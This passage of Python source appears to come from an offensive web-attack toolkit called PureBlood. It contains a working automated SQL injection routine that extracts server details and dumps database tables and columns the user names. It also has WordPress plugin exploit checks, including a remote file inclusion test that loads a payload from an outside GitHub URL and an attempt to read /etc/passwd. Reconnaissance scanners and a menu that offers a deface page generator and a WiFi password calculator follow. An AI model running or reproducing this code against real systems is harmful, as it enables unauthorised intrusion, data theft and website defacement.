            auto_sql_injection_request_version = requests.get(auto_sql_injection_request_version_url)
            auto_sql_injection_request_basedir = requests.get(auto_sql_injection_request_basedir_url)
            auto_sql_injection_request_user = requests.get(auto_sql_injection_request_user_url)
            auto_sql_injection_request_database = requests.get(auto_sql_injection_request_database_url)
            auto_sql_injection_request_schema = requests.get(auto_sql_injection_request_schema_url)
            auto_sql_injection_request_uuid = requests.get(auto_sql_injection_request_uuid_url)
            auto_sql_injection_request_system_user = requests.get(auto_sql_injection_request_system_user_url)
            auto_sql_injection_request_session_user = requests.get(auto_sql_injection_request_session_user_url)
            auto_sql_injection_request_symlink = requests.get(auto_sql_injection_request_symlink_url)
            auto_sql_injection_request_ssl = requests.get(auto_sql_injection_request_ssl_url)
            sqli_hostname_soup = BeautifulSoup(auto_sql_injection_request_hostname.text, 'html.parser')
            sqli_tmpdir_soup = BeautifulSoup(auto_sql_injection_request_tmpdir.text, 'html.parser')
            sqli_datadir_soup = BeautifulSoup(auto_sql_injection_request_datadir.text, 'html.parser')
            sqli_version_soup = BeautifulSoup(auto_sql_injection_request_version.text, 'html.parser')
            sqli_basedir_soup = BeautifulSoup(auto_sql_injection_request_basedir.text, 'html.parser')
            sqli_user_soup = BeautifulSoup(auto_sql_injection_request_user.text, 'html.parser')
            sqli_database_soup = BeautifulSoup(auto_sql_injection_request_database.text, 'html.parser')
            sqli_schema_soup = BeautifulSoup(auto_sql_injection_request_schema.text, 'html.parser')
            sqli_uuid_soup = BeautifulSoup(auto_sql_injection_request_uuid.text, 'html.parser')
            sqli_system_user_soup = BeautifulSoup(auto_sql_injection_request_system_user.text, 'html.parser')
            sqli_session_user_soup = BeautifulSoup(auto_sql_injection_request_session_user.text, 'html.parser')
            sqli_symlink_soup = BeautifulSoup(auto_sql_injection_request_symlink.text, 'html.parser')
            sqli_ssl_soup = BeautifulSoup(auto_sql_injection_request_ssl.text, 'html.parser')
            sqli_hostname = sqli_hostname_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_tmpdir = sqli_tmpdir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_datadir = sqli_datadir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_version = sqli_version_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_basedir = sqli_basedir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_user = sqli_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_database = sqli_database_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_schema = sqli_schema_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_uuid = sqli_uuid_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_system_user = sqli_system_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_session_user = sqli_session_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_symlink = sqli_symlink_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_ssl = sqli_ssl_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            print ('[+] Hostname: {0}'.format(sqli_hostname))
            print ('[+] TMP Directory: {0}'.format(sqli_tmpdir))
            print ('[+] Data Directory: {0}'.format(sqli_datadir))
            print ('[+] Database Version: {0}'.format(sqli_version))
            print ('[+] Base Directory: {0}'.format(sqli_basedir))
            print ('[+] Current User: {0}'.format(sqli_user))
            print ('[+] Current Database: {0}'.format(sqli_database))
            print ('[+] Current Schema: {0}'.format(sqli_schema))
            print ('[+] System UUID Key: {0}'.format(sqli_uuid))
            print ('[+] Current System User: {0}'.format(sqli_system_user))
            print ('[+] Session User: {0}'.format(sqli_session_user))
            print ('[+] Is Sysmlink Enabled?: {0}'.format(sqli_symlink))
            print ('[+] Is SSL Enabled?: {0}'.format(sqli_ssl))
            print ('')
            print ('[~] Dumping Database:')
            auto_sql_injection_request_dios_soup_pureblood_list = []
            auto_sql_injection_request_dios_soup_pureblood = auto_sql_injection_request_dios_soup.findAll('strong', attrs={'id': 'PureBlood'})
            for i in auto_sql_injection_request_dios_soup_pureblood:
                if i.text in auto_sql_injection_request_dios_soup_pureblood_list:
                    pass
                else:
                    auto_sql_injection_request_dios_soup_pureblood_list.append(i.text)
            for i in auto_sql_injection_request_dios_soup_pureblood_list:
                print ('\t{0}'.format(i))
            print ('')
            sqli_table = ''
            user_choice = ''
            sqli_column = []
            print ('{2}[{1}#{2}] {3}- {4}Just enter exit/done if you want to start dumping{0}'.format(reset + bold, green, blue, yellow, cyan))
            while True:
                if sys.version_info[0] == 3:
                    if sqli_table:
                        pass
                    elif not sqli_table:
                        user_choice1 = str(input('Table> '))
                        sqli_table = user_choice1
                    user_choice = str(input('\tColumn> '))
                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':
                        break
                    else:
                        sqli_column.append(user_choice)
                if sys.version_info[0] == 2:
                    if sqli_table:
                        pass
                    elif not sqli_table:
                        user_choice1 = str(raw_input('Table> '))
                        sqli_table = user_choice1
                    user_choice = str(raw_input('\tColumn> '))
                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':
                        break
                    else:
                        sqli_column.append(user_choice)
            print ('')
            print ('[~] Dumping Columns:')
            for i in sqli_column:
                auto_sql_injection_request_column_dump_list = []
                auto_sql_injection_request_column_dump_url = '{0}{1} /*!50000Union*/ all select {2} from {3}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii, sqli_table)
                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_dump_column_payload + ',')
                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace('<column>', i)
                auto_sql_injection_request_column_dump = requests.get(auto_sql_injection_request_column_dump_url)
                auto_sql_injection_request_column_dump_soup = BeautifulSoup(auto_sql_injection_request_column_dump.text, 'html.parser')
                auto_sql_injection_request_column_dump_soup_pureblood = auto_sql_injection_request_column_dump_soup.find_all('strong', attrs={'id': 'PureBloodINFO'})
                for ii in auto_sql_injection_request_column_dump_soup_pureblood:
                    if ii.text in auto_sql_injection_request_column_dump_list:
                        pass
                    elif ii.text not in auto_sql_injection_request_column_dump_list:
                        auto_sql_injection_request_column_dump_list.append(ii.text)
                for iii in auto_sql_injection_request_column_dump_list:
                    print ('\t{0} -> {1}'.format(i, iii))

    def auto_xss_injection(self, xi_url):
        print ('')

    def wordpress_vulnerability_check(self, wvc_url):
        print ('[#] - Checking (WordPress Woocommerce - Directory Craversal):')
        wp_woocommerce_wvc_url = ''
        wp_woocommerce = requests.get(wvc_url + '/wp-content/plugins/woocommerce/templates/emails/plain')
        wp_woocommerce_wvc_url = wvc_url + '/wp-content/plugins/woocommerce/templates/emails/plain'
        if wp_woocommerce.status_code == 200:
            print ('\t[+] - Vulnerable! ~ ' + wp_woocommerce_wvc_url)
        elif wp_woocommerce.status_code == 301:
            print ('\t[!] - Redirected! ~ ' + wp_woocommerce_wvc_url)
        elif wp_woocommerce.status_code == 403:
            print ('\t[!] - Forbidden! ~ ' + wp_woocommerce_wvc_url)
        else:
            print ('\t[!] - 404 Found! ~ ' + wp_woocommerce_wvc_url)
        print ('\n\n[#] - Checking (Wordpress Plugin Booking Calendar 3.0.0 - SQL Injection / Cross-Site Scripting):')
        wp_plugin_booking_calendar_wvc_url = ''
        wp_plugin_booking_calendar = requests.get(wvc_url + '/BOOKING_WP/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php')
        if wp_plugin_booking_calendar.status_code == 200:
            wp_plugin_booking_calendar = wp_plugin_booking_calendar
            wp_plugin_booking_calendar_wvc_url = wvc_url + '/BOOKING_WP/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'
        elif wp_plugin_booking_calendar.status_code == 404:
            wp_plugin_booking_calendar = requests.get(wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php')
            if wp_plugin_booking_calendar.status_code == 200:
                wp_plugin_booking_calendar = wp_plugin_booking_calendar
                wp_plugin_booking_calendar_wvc_url = wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'
            else:
                wp_plugin_booking_calendar_wvc_url = wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'
                wp_plugin_booking_calendar = 'Not Found'
        if wp_plugin_booking_calendar == 'Not Found':
            wp_plugin_booking_calendar_wvc_url = wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'
            print ('\t[!] - 404 Found! ~ ' + wp_plugin_booking_calendar_wvc_url)
        else:
            print ('\t[+] - XSS Maybe Vulnerable! ~ ' + wp_plugin_booking_calendar_wvc_url + '?month=<XSS Payload>')
            print ('\t[+] - SQLMap Maybe Vulnerable! ~ ' + wp_plugin_booking_calendar_wvc_url + '?month=')
            print ('\t[+] - Unfortunately I can\'t handle alerts without using Selenium and you should manually use SQLMap. Try to do it manually')
        print ('\n\n[#] - Checking (WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion):')
        wp_plugin_wp_spritz_wvc_url = ''
        wp_plugin_wp_spritz = requests.get(wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php')
        if wp_plugin_wp_spritz.status_code == 200:
            wp_plugin_wp_spritz = requests.get(wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=https://raw.githubusercontent.com/cr4shcod3/pureblood/master/l33t/rfi.txt')
            wp_plugin_wp_spritz_wvc_url = wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=https://raw.githubusercontent.com/cr4shcod3/pureblood/master/l33t/rfi.txt'
            if 'PureBlood RFI ~Cr4sHCoD3' in wp_plugin_wp_spritz.text:
                print ('\t[+] - Vulnerable! ~ ' + wp_plugin_wp_spritz_wvc_url)
                wp_plugin_wp_spritz = requests.get(wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=/etc/passwd')
                if wp_plugin_wp_spritz.status_code == 403 or wp_plugin_wp_spritz.status_code == 400:
                    print ('\t[+] - Try to bypass LFI! ~ ' + wp_woocommerce_wvc_url)
                elif 'The page you are trying to access is restricted due to a security rule.' in wp_plugin_wp_spritz.text:
                    print ('\t[+] - Try to bypass LFI! ~ ' + wp_woocommerce_wvc_url)
        elif wp_plugin_wp_spritz.status_code == 404:
            wp_plugin_wp_spritz_wvc_url = wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php'
            print ('\t[!] - 404 Found! ~ ' + wp_plugin_wp_spritz_wvc_url)
        print ('\n\n[#] - Checking (WordPress Plugin Events Calendar - \'event_id\' SQL Injection):')
        wp_plugin_events_calendar_wvc_url = ''
        wp_plugin_events_calendar = requests.get(wvc_url + '/event.php?event_id=1')
        if wp_plugin_events_calendar.status_code == 200:
            wp_plugin_events_calendar_result = ''
            wp_plugin_events_calendar = requests.get(wvc_url + '/event.php?event_id=1\'')
            wp_plugin_events_calendar_wvc_url = wvc_url + '/event.php?event_id=1\''
            for db, errors in dbms_errors.items():
                for error in errors:
                    if re.compile(error).search(wp_plugin_events_calendar.text):
                        wp_plugin_events_calendar_result = 'Vulnerable'
                        print ('\t[+] - ' + db + ' Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)
            if wp_plugin_events_calendar_result == '':
                print ('\t[!] - Not Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)
        elif wp_plugin_events_calendar.status_code == 404:
            wp_plugin_events_calendar = requests.get(wvc_url + '/view-event.php?event_id=1')
            wp_plugin_events_calendar_wvc_url = wvc_url + '/view-event.php?event_id=1'
            if wp_plugin_events_calendar.status_code == 200:
                wp_plugin_events_calendar_result = ''
                wp_plugin_events_calendar = requests.get(wvc_url + '/view-event.php?event_id=1\'')
                wp_plugin_events_calendar_wvc_url = wvc_url + '/view-event.php?event_id=1\''
                for db, errors in dbms_errors.items():
                    for error in errors:
                        if re.compile(error).search(wp_plugin_events_calendar.text):
                            wp_plugin_events_calendar_result = 'Vulnerable'
                            print ('\t[+] - ' + db + ' Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)
                if wp_plugin_events_calendar_result == '':
                    print ('\t[!] - Not Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)
            elif wp_plugin_events_calendar.status_code == 404:
                print ('\t[!] - 404 Found! ~ ' + wp_plugin_events_calendar_wvc_url)



class WebPentest:
    def banner_grab(self, bg_url):
        try:
            banner_grab_request = requests.get(bg_url)
            banner_grab_result = banner_grab_request.headers
            banner_grab_result = str(banner_grab_result).replace("{'", "").replace("'}", "").replace("': '", ": ").replace("', '", ",\n")
            self.banner_grab_result = banner_grab_result
            return self.banner_grab_result
        except:
            print("Could not grab a banner info")

    def whois(self, w_url):
        try:
            whois_query = whois.whois(w_url)
            self.whois_result = whois_query
            return self.whois_result
        except:
            print("Could not find perform whois")

    def traceroute(self, t_hostname):
        try:
            traceroute_request = requests.get('https://api.hackertarget.com/mtr/?q=' + t_hostname)
            traceroute_response = traceroute_request.text
            traceroute_final = """{0}""".format(str(traceroute_response))
            self.traceroute_result = traceroute_final
            return self.traceroute_result
        except:
            print("Could not perform traceroute")

    def dns_record(self, dr_hostname):
        try:
            dns_record_list = []
            for i in ids:
                t = threading.Thread(target=dns_record_scanner, args=(dr_hostname, i, dns_record_list, ))
                t.start()
            t.join()
            self.dns_record_result = dns_record_list
            return self.dns_record_result
        except:
            print("Could not find DNS record")

    def reverse_dns_lookup(self, rdl_ip):
        try:
            rdl_ip = rdl_ip + '/24'
            reverse_dns_lookup_request = requests.get('https://api.hackertarget.com/reversedns/?q=' + rdl_ip)
            reverse_dns_lookup_response = reverse_dns_lookup_request.text
            reverse_dns_lookup_final = """{0}""".format(str(reverse_dns_lookup_response))
            self.reverse_ip_lookup_result = reverse_dns_lookup_final
            return self.reverse_ip_lookup_result
        except:
            print("Could not perform dns reverse lookup")

    def zone_transfer_lookup(self, ztl_hostname):
        try:
            zone_transfer_lookup_request = requests.get('https://api.hackertarget.com/zonetransfer/?q=' + ztl_hostname)
            zone_transfer_lookup_response = zone_transfer_lookup_request.text
            zone_transfer_lookup_final = """{0}""".format(str(zone_transfer_lookup_response))
            self.zone_transfer_lookup_result = zone_transfer_lookup_final
            return self.zone_transfer_lookup_result
        except:
            print("Could not perform zone transfer lookup")

    def port_scan(self, ps_hostname, ps_pend): #https://stackoverflow.com/a/38210023
        port_scan_list = []
        threads = []
        output = {}
        delay = 10
        for i in range(ps_pend + 1):
            t = threading.Thread(target=TCP_connect, args=(ps_hostname, i, delay, output))
            threads.append(t)
        for i in range(ps_pend + 1):
            threads[i].start()
        for i in range(ps_pend + 1):
            threads[i].join()
        for i in range(ps_pend + 1):
            if output[i] == 'Open':
                port_scan_list.append('[+] Port Open - ' + str(i))
        self.port_scan_result = port_scan_list
        return self.port_scan_result

    def admin_panel_scan(self, ads_url):
        admin_panel_valid = []
        admin_panel_redirect = []
        ads_urls = []
        r_path = []
        ads_r_urls = []
        robots = ['/robot.txt', '/robots.txt']
        for i in admin_panel_list:
            ads_urls.append(ads_url + i)
        for i in robots:
            r_robots = requests.get(ads_url + i)
            if r_robots.status_code == 200:
                r_robots = r_robots
            else:
                r_robots = ''
        if r_robots == '':
            pass
        else:
            robots = str(r_robots.text)
            for i in robots.split("\n"):
                if i.startswith('Allow'):
                    r_path.append(i.split(': ')[1].split(' ')[0])
                elif i.startswith('Disallow'):
                    r_path.append(i.split(': ')[1].split(' ')[0])
            for i in r_path:
                ads_r_urls.append(ads_url + i)
        for i in ads_r_urls:
            ads_r_urls_request = requests.get(i)
            if 'Admin' in ads_r_urls_request.text or 'Login' in ads_r_urls_request.text:
                r_admin_panel = i
                admin_panel_valid.append(i)
            elif 'admin' in ads_r_urls_request.text or 'login' in ads_r_urls_request.text:
                r_admin_panel = i
                admin_panel_valid.append(i)
            elif 'Username' in ads_r_urls_request.text or 'Password' in ads_r_urls_request.text:
                r_admin_panel = i
                admin_panel_valid.append(i)
            elif 'username' in ads_r_urls_request.text or 'password' in ads_r_urls_request.text:
                r_admin_panel = i
                admin_panel_valid.append(i)
            else:
                r_admin_panel = None
        if not admin_panel_valid:
            for i in ads_urls:
                admin_scan_request = requests.get(i)
                if admin_scan_request.status_code == 200:
                    admin_panel_valid.append(i)
                    break
                elif admin_scan_request.status_code == 301 or admin_scan_request.status_code == 302:
                    admin_panel_redirect.append(i)
        else:
            pass
        admin_panel_valid = list(set(admin_panel_valid))
        for i in admin_panel_redirect:
            admin_panel_valid.append(i + ' - 301')
        if not admin_panel_valid:
            webbrowser.open_new_tab(google_hacking + 'site:' + ads_url + '+inurl:login | admin | user | cpanel | account | moderator | phpmyadmin | /cp')
        self.admin_panel_scan_result = admin_panel_valid
        return self.admin_panel_scan_result

    def subdomain_scan(self, ss_hostname, subdomain_list):
        so_200 = []
        so_301 = []
        so_302 = []
        so_403 = []
        ss_urls = []
        ss_subdomain_list = open(subdomain_list, 'r')
        ss_subdomain_list = ss_subdomain_list.read().splitlines()
        for i in ss_subdomain_list:
            ss_urls.append(i + '.' + ss_hostname)
        for i in ss_urls:
            t = threading.Thread(target=subdomain_scanner, args=(i, so_200, so_301, so_302, so_403,))
            t.start()
        t.join()
        self.ss_200_result = so_200
        self.ss_301_result = so_301
        self.ss_302_result = so_302
        self.ss_403_result = so_403
        return self.ss_200_result, self.ss_301_result, self.ss_302_result, self.ss_403_result

    def cms_detect(self, cd_hostname):
        cd_cms = []
        cd_cms_version = []
        cms_detect_request = requests.get('https://whatcms.org/?s=' + cd_hostname)
        cd_soup = BeautifulSoup(cms_detect_request.content, 'html.parser')
        cd_soup_div = cd_soup.find('div', attrs={'class': 'large text-center'})
        for i in cd_soup_div.find_all('span', attrs={'class': 'nowrap'}):
            cd_cms_version.append(i.text)
        cd_cms.append(cd_soup_div.find('a').text)
        if not cd_cms:
            cms_detect_final = '[!] - There\'s no CMS Detected!'
        else:
            cd_cms_version = cd_cms_version[1]
            cms_detect_final = cd_cms[0].replace('/c/', '')
            cms_detect_final = cms_detect_final + ' - ' + cd_cms_version
        self.cms_detect_result = cms_detect_final
        return self.cms_detect_result

    def reverse_ip_lookup(self, ril_hostname):
        reverse_ip_lookup_request = requests.get('https://api.hackertarget.com/reverseiplookup/?q=' + ril_hostname)
        reverse_ip_lookup_response = reverse_ip_lookup_request.text
        reverse_ip_lookup_final = """{0}""".format(str(reverse_ip_lookup_response))
        self.reverse_ip_lookup_result = reverse_ip_lookup_final
        return self.reverse_ip_lookup_result

    def subnet_lookup(self, subnet_input):
        subnet_lookup_request = requests.get('https://api.hackertarget.com/subnetcalc/?q=' + subnet_input)
        subnet_lookup_response = subnet_lookup_request.text
        subnet_lookup_final = """{0}""".format(str(subnet_lookup_response))
        self.subnet_lookup_result = subnet_lookup_final
        return self.subnet_lookup_result

    def links_extract(self, le_url):
        links_extract_request = requests.get('https://api.hackertarget.com/pagelinks/?q=' + le_url)
        links_extract_response = links_extract_request.text
        links_extract_final = """{0}""".format(str(links_extract_response))
        self.links_extract_result = links_extract_final
        return self.links_extract_result

    def directory_fuzz(self, df_url, directory_list):
        directory_fuzz_final1 = []
        directory_fuzz_final2 = []
        directory_fuzz_final3 = []
        directory_list_open = open(directory_list, 'r')
        directory_list = directory_list_open.read().splitlines()
        df_url_list = []
        ii = 0
        for i in directory_list:
            if '/' in directory_list[ii]:
                df_url_list.append(df_url + i)
            else:
                df_url_list.append(df_url + '/' + i)
            ii = ii + 1
        for i in df_url_list:
            print (i)
            t = threading.Thread(target=directory_scanner, args=(i, directory_fuzz_final1, directory_fuzz_final2, directory_fuzz_final3))
            t.start()
        t.join()
        self.directory_fuzz_result1 = directory_fuzz_final1
        self.directory_fuzz_result2 = directory_fuzz_final2
        self.directory_fuzz_result3 = directory_fuzz_final3
        return self.directory_fuzz_result1, self.directory_fuzz_result2, self.directory_fuzz_result3\

    def file_fuzz(self, ff_url, file_list):
        file_fuzz_final1 = []
        file_fuzz_final2 = []
        file_fuzz_final3 = []
        file_list_open = open(file_list, 'r')
        file_list = file_list_open.read().splitlines()
        ff_url_list = []
        for i in file_list:
            ff_url_list.append(ff_url + '/' + i)
        for i in ff_url_list:
            t = threading.Thread(target=file_scanner, args=(i, file_fuzz_final1, file_fuzz_final2, file_fuzz_final3))
            t.start()
        t.join()
        self.file_fuzz_result1 = file_fuzz_final1
        self.file_fuzz_result2 = file_fuzz_final2
        self.file_fuzz_result3 = file_fuzz_final3
        return self.file_fuzz_result1, self.file_fuzz_result2, self.file_fuzz_result3

    def shodan_search(self, query, ss_SHODAN_API_KEY):
        shodan_api = shodan.Shodan(ss_SHODAN_API_KEY)
        try:
            shodan_search_results = shodan_api.search(query)
            self.shodan_search_result = shodan_search_results
            return self.shodan_search_result
        except shodan.APIError as e:
            print ('[!] - Error: {0}'.format(e))
            time.sleep(2)
            web_pentest()

    def shodan_host_lookup(self, shodan_host, shl_SHODAN_API_KEY):
        shodan_api = shodan.Shodan(shl_SHODAN_API_KEY)
        try:
            shodan_host_lookup_results = shodan_api.host(shodan_host)
            self.shodan_host_lookup_result = shodan_host_lookup_results
            return self.shodan_host_lookup_result
        except shodan.APIError as e:
            print ('[!] - Error: {0}'.format(e))
            time.sleep(2)
            web_pentest()



def create_directories():
    if not os.path.exists('outputs'):
        os.mkdir('outputs')
    else:
        pass
    if not os.path.exists('outputs/generator'):
        os.mkdir('outputs/generator')
    else:
        pass
    if not os.path.exists('outputs/web_pentest'):
        os.mkdir('outputs/web_pentest')
    else:
        pass
    if not os.path.exists('outputs/web_pentest/shodan'):
        os.mkdir('outputs/web_pentest/shodan')
    else:
        pass
    if not os.path.exists('outputs/web_application_attack'):
        os.mkdir('outputs/web_application_attack')
    else:
        pass
    if not os.path.exists('external'):
        os.mkdir('external')
    else:
        pass



def clear():
    if platform.system() == 'Linux':
        os.system('clear')
    elif platform.system() == 'Windows':
        os.system('cls')
    elif platform.system() == 'Darwin':
        os.system('clear')
    else:
        os.system('clear')



def banner():
    try:
        if sys.version_info[0] == 3:
            banner = ("""{1}
 ██▓███   █    ██  ██▀███  ▓█████  ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄
▓██░  ██▒ ██  ▓██▒▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
▓██░ ██▓▒▓██  ▒██░▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▒██▄█▓▒ ▒▓▓█  ░██░▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
▒██▒ ░  ░▒▒█████▓ ░██▓ ▒██▒░▒████▒░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓
▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒
░▒ ░     ░░▒░ ░ ░   ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒
░░        ░░░ ░ ░   ░░   ░    ░    ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░
            ░        ░        ░  ░ ░          ░  ░    ░ ░      ░ ░     ░
                                        ░                            ░

     {2}--={3}[ {0}{5}Author: Cr4sHCoD3                     {3}]{2}=--
{4}| {2}-- --={3}[ {0}{5}Version: 2                            {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}Website: https://github.com/cr4shcod3 {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}PureHackers ~ Blood Security Hackers  {3}]{2}=-- -- {4}|
{0}


""".format(reset, red, green, blue, yellow, bold))
        elif sys.version_info[0] == 2:
            banner = ("""{1}
 ██▓███   █    ██  ██▀███  ▓█████  ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄
▓██░  ██▒ ██  ▓██▒▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
▓██░ ██▓▒▓██  ▒██░▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
▒██▄█▓▒ ▒▓▓█  ░██░▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
▒██▒ ░  ░▒▒█████▓ ░██▓ ▒██▒░▒████▒░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓
▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒
░▒ ░     ░░▒░ ░ ░   ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒
░░        ░░░ ░ ░   ░░   ░    ░    ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░
            ░        ░        ░  ░ ░          ░  ░    ░ ░      ░ ░     ░
                                        ░                            ░

     {2}--={3}[ {0}{5}Author: Cr4sHCoD3                     {3}]{2}=--
{4}| {2}-- --={3}[ {0}{5}Version: 2                            {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}Website: https://github.com/cr4shcod3 {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}PureHackers ~ Blood Security Hackers  {3}]{2}=-- -- {4}|
{0}


""".format(reset, red, green, blue, yellow, bold)).decode('utf-8')
        print (banner)
    except:
        if sys.version_info[0] == 3:
            banner = ("""{1}
        o--o               o--o  o            o
        |   |              |   | |            |
        O--o  o  o o-o o-o O--o  | o-o o-o  o-O
        |     |  | |   |-' |   | | | | | | |  |
        o     o--o o   o-o o--o  o o-o o-o  o-o

     {2}--={3}[ {0}{5}Author: Cr4sHCoD3                     {3}]{2}=--
{4}| {2}-- --={3}[ {0}{5}Version: 2                            {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}Website: https://github.com/cr4shcod3 {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}PureHackers ~ Blood Security Hackers  {3}]{2}=-- -- {4}|
{0}


""".format(reset, red, green, blue, yellow, bold))
        elif sys.version_info[0] == 2:
            banner = ("""{1}
        o--o               o--o  o            o
        |   |              |   | |            |
        O--o  o  o o-o o-o O--o  | o-o o-o  o-O
        |     |  | |   |-' |   | | | | | | |  |
        o     o--o o   o-o o--o  o o-o o-o  o-o

     {2}--={3}[ {0}{5}Author: Cr4sHCoD3                     {3}]{2}=--
{4}| {2}-- --={3}[ {0}{5}Version: 2                            {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}Website: https://github.com/cr4shcod3 {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}PureHackers ~ Blood Security Hackers  {3}]{2}=-- -- {4}|
{0}


""".format(reset, red, green, blue, yellow, bold)).decode('utf-8')
        print (banner)



def set_target(target, wfunc):
    global url
    global hostname
    global ip
    if '=' in target and wfunc != 2:
        target = urlparse(target)
        if target.scheme == '':
            target = ('{0}'.format(target.netloc))
        else:
            target = ('{0}://{1}'.format(target.scheme, target.netloc))
    if 'http://' in target:
        url = target
        hostname = target.replace('http://', '')
    elif 'https://' in target:
        url = target
        hostname = target.replace('https://', '')
    if '://' not in target:
        url = 'http://' + target
        hostname = target
    if '1' == target[0] or '2' == target[0] or '3' == target[0] or '4' == target[0] or '5' == target[0] or '6' == target[0] or '7' == target[0] or '8' == target[0] or '9' == target[0]:
        ip = target
    if wfunc == 2:
        pass
    else:
        ip = socket.gethostbyname(hostname)
    if wfunc == 1:
        web_pentest()
    elif wfunc == 2:
        web_application_attack()
    else:
        main()



def generator():
    print ("""{3}[ {5}Generator {3}]

    {2}01{3}) {5}Deface Page Generator
    {2}02{3}) {5}Password Generator
    {2}03{3}) {5}PLDT WiFi Password Calculator
    {2}04{3}) {5}Text To Hash
    {2}90{3}) {5}Back To Menu
    {2}99{3}) {5}Exit
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PureBlood{1}({3}Generator{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            generator()
    elif sys.version_info[0] == 2:
        try:
            choice = int(raw_input('{0}PureBlood{1}({3}Generator{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
            print ('\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))
            time.sleep(2)
            print ('')
            generator()
    cgenerator = Generator()
    if choice == 1:
        print ('{0}='.format(red) * int(sizex))
        print (reset + bold)
        if sys.version_info[0] == 3:
            title = str(input('{0}PureBlood{1}>{0}Generator{1}>({3}Title{1})> {2}'.format(green, blue, cyan, red)))
